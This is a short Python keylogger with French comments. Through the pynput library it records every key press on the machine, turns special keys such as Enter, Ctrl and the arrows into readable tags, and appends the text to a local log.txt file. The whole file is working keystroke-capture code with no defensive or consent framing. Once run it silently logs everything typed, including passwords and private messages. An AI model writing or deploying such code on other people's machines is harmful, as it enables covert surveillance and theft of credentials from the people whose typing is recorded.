from pynput.keyboard import Listener

def ecrire_Au_Fichier(touche):

    #Logique formatage de la sortie
    Lettre = str(touche) #PROBLEME : sortie de base, si la touche est [A] la sortie sera 'A'
    Lettre = Lettre.replace("'", "") #FIX : Ajuster l'impression de la lettre pour remplacer les "'" par rien

    remplacements = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",

        "Key.backspace": "[BACKSPACE]",
        "Key.delete": "[DELETE]",
        "Key.esc": "[ESC]",

        "Key.shift": "",
        "Key.shift_l": "",
        "Key.shift_r": "",

        "Key.ctrl": "[CTRL]",
        "Key.ctrl_l": "[CTRL]",
        "Key.ctrl_r": "[CTRL]",

        "Key.alt": "[ALT]",
        "Key.alt_l": "[ALT]",
        "Key.alt_r": "[ALT]",
        "Key.alt_gr": "[ALT]",

        "Key.caps_lock": "[CAPS_LOCK]",
        "Key.cmd": "[CMD]",
        "Key.cmd_l": "[CMD]",
        "Key.cmd_r": "[CMD]",

        "Key.up": "[UP]",
        "Key.down": "[DOWN]",
        "Key.left": "[LEFT]",
        "Key.right": "[RIGHT]",

        "Key.home": "[HOME]",
        "Key.end": "[END]",
        "Key.page_up": "[PAGE_UP]",
        "Key.page_down": "[PAGE_DOWN]",

        "Key.f1": "[F1]",
        "Key.f2": "[F2]",
        "Key.f3": "[F3]",
        "Key.f4": "[F4]",
        "Key.f5": "[F5]",
        "Key.f6": "[F6]",
        "Key.f7": "[F7]",
        "Key.f8": "[F8]",
        "Key.f9": "[F9]",
        "Key.f10": "[F10]",
        "Key.f11": "[F11]",
        "Key.f12": "[F12]"
    }

    Lettre = remplacements.get(Lettre, Lettre)

    #Logique impression dans le fichier
    with open("log.txt", "a") as fichier:
        fichier.write(Lettre)

with Listener(on_press=ecrire_Au_Fichier) as L: # L est un listener
    L.join() #on append les données
